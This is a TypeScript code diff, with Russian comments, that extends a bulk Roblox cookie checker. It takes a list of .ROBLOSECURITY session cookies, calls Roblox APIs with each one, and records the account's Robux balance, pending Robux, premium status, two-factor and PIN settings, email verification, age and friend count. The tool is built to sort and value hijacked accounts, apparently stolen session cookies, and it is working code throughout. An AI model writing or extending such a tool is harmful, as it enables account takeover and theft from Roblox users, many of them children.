@@ -32,37 +32,53 @@ export async function validateCookies(cookies: string[]): Promise<void> {
   for (const cookie of cookies) {
     queueService.enqueue(async () => {
       try {
-        // Check if cookie is valid
-        const cookieValid = await checkCookieValid(cookie);
+        // Get account info
+        const accountInfo = await getAccountInfo(cookie);
         
-        // Create account info object
-        const accountInfo: RobloxAccount = {
-          cookie,
-          isValid: cookieValid,
-          username: cookieValid ? "Valid Account" : "",
-          userId: "",
-          robuxBalance: 0,
-          pendingRobux: 0,
-          premium: false,
-          donations: 0,
-          rap: 0,
-          hasHeadless: false,
-          hasKorblox: false,
-          avatarUrl: "",
-          processedAt: new Date().toISOString(),
-        };
+        if (!accountInfo) {
+          // Store invalid result
+          await storage.storeCookie({
+            cookie,
+            isValid: false,
+            username: "",
+            userId: "",
+            robuxBalance: 0,
+            pendingRobux: 0,
+            premium: false,
+            donations: 0,
+            rap: 0,
+            hasHeadless: false,
+            hasKorblox: false,
+            avatarUrl: "",
+            displayName: "",
+            accountAge: 0,
+            emailVerified: false,
+            twoFactor: false,
+            hasPin: false,
+            voiceChat: false,
+            friendsCount: 0,
+            isAbove13: false,
+            description: "",
+            processedAt: new Date().toISOString(),
+          });
+          
+          // Update queue status
+          queueService.processingComplete(false);
+          
+          // Add to log
+          queueService.addLogEntry(`✗ Invalid cookie`);
+          return;
+        }
         
         // Store the result
         await storage.storeCookie(accountInfo);
         
         // Update queue status
-        queueService.processingComplete(cookieValid);
+        queueService.processingComplete(true);
         
         // Add to log
         queueService.addLogEntry(
-          cookieValid
-            ? `✓ Cookie is valid`
-            : `✗ Cookie is invalid`
+          `✓ Valid: ${accountInfo.username} | R$: ${accountInfo.robuxBalance} | Premium: ${accountInfo.premium ? 'Да' : 'Нет'}`
         );
       } catch (error: any) {
         console.error("Error validating cookie:", error);
@@ -81,6 +97,15 @@ export async function validateCookies(cookies: string[]): Promise<void> {
           hasHeadless: false,
           hasKorblox: false,
           avatarUrl: "",
+          displayName: "",
+          accountAge: 0,
+          emailVerified: false,
+          twoFactor: false,
+          hasPin: false,
+          voiceChat: false,
+          friendsCount: 0,
+          isAbove13: false,
+          description: "",
           processedAt: new Date().toISOString(),
         };
         
@@ -100,8 +125,112 @@ export async function validateCookies(cookies: string[]): Promise<void> {
 }
 
 /**
+ * Get detailed information about a Roblox account
+ * @param cookie Roblox cookie
+ * @returns Account information or null if cookie is invalid
+ */
+async function getAccountInfo(cookie: string): Promise<RobloxAccount | null> {
+  try {
+    const cleanCookie = formatCookie(cookie);
+    const headers = { 'Cookie': `.ROBLOSECURITY=${cleanCookie}`, 'User-Agent': 'Mozilla/5.0' };
+    
+    // Проверка валидности куки через запрос баланса (как в Python скрипте)
+    const validCheck = await fetch('https://economy.roblox.com/v1/user/currency', { headers });
+    
+    if (validCheck.status !== 200) {
+      return null;
+    }
+    
+    // Получаем баланс Robux
+    const robuxData = await validCheck.json() as { robux?: number };
+    const robux = robuxData.robux || 0;
+    
+    // Получаем информацию о пользователе
+    const userInfoResponse = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
+    if (!userInfoResponse.ok) return null;
+    const userInfo = await userInfoResponse.json() as { 
+      name?: string; 
+      id?: number | string; 
+      displayName?: string 
+    };
+    
+    // Получаем настройки пользователя
+    const settingsResponse = await fetch('https://www.roblox.com/my/settings/json', { headers });
+    if (!settingsResponse.ok) return null;
+    const settings = await settingsResponse.json() as { 
+      isPremium?: boolean; 
+      AccountAgeInDays?: number; 
+      IsEmailVerified?: boolean;
+      MyAccountSecurityModel?: { IsTwoStepEnabled?: boolean };
+      IsAccountPinEnabled?: boolean;
+      UserAbove13?: boolean;
+    };
+    
+    // Проверка голосового чата
+    const voiceChatResponse = await fetch('https://voice.roblox.com/v1/settings', { headers });
+    const voiceChatData = await voiceChatResponse.json() as { isVerifiedForVoice?: boolean };
+    
+    // Получаем количество друзей
+    const friendsResponse = await fetch('https://friends.roblox.com/v1/my/friends/count', { headers });
+    const friendsData = await friendsResponse.json() as { count?: number };
+    
+    // Получаем описание профиля
+    const descriptionResponse = await fetch('https://users.roblox.com/v1/description', { headers });
+    const descriptionData = await descriptionResponse.json() as { description?: string };
+    
+    // Получаем информацию о транзакциях
+    const transactionsResponse = await fetch(
+      `https://economy.roblox.com/v2/users/${userInfo.id}/transaction-totals?timeFrame=Year&transactionType=summary`,
+      { headers }
+    );
+    const transactionsData = await transactionsResponse.json() as { 
+      pendingRobuxTotal?: number;
+      incomingRobuxTotal?: number; 
+    };
+    
+    // Проверка на наличие предметов Headless и Korblox
+    let hasHeadless = false;
+    let hasKorblox = false;
+    
+    try {
+      // В идеале здесь должен быть запрос к API для проверки наличия предметов
+      // Но для упрощения мы просто ставим false
+    } catch (e) {
+      console.error("Error checking items:", e);
+    }
+    
+    return {
+      cookie,
+      isValid: true,
+      username: userInfo.name || "",
+      userId: (userInfo.id?.toString()) || "",
+      robuxBalance: robux,
+      pendingRobux: transactionsData?.pendingRobuxTotal || 0,
+      premium: Boolean(settings.isPremium),
+      donations: transactionsData?.incomingRobuxTotal || 0,
+      rap: 0, // Требуется дополнительный запрос для получения RAP
+      hasHeadless,
+      hasKorblox,
+      avatarUrl: `https://www.roblox.com/avatar-thumbnails?userId=${userInfo.id}&size=150x150`,
+      displayName: userInfo.displayName || "",
+      accountAge: Math.round((settings.AccountAgeInDays || 0) / 365 * 100) / 100,
+      emailVerified: Boolean(settings.IsEmailVerified),
+      twoFactor: Boolean(settings.MyAccountSecurityModel?.IsTwoStepEnabled),
+      hasPin: Boolean(settings.IsAccountPinEnabled),
+      voiceChat: Boolean(voiceChatData.isVerifiedForVoice),
+      friendsCount: friendsData.count || 0,
+      isAbove13: Boolean(settings.UserAbove13),
+      description: descriptionData.description || "",
+      processedAt: new Date().toISOString(),
+    };
+  } catch (error) {
+    console.error(`Error getting account info: ${error}`);
+    return null;
+  }
+}
+
+/**
  * Simple check if a cookie is valid using Roblox API
- * Based on your Python example code
  * @param cookie Roblox cookie to validate
  * @returns Promise<boolean> indicating if cookie is valid
  */
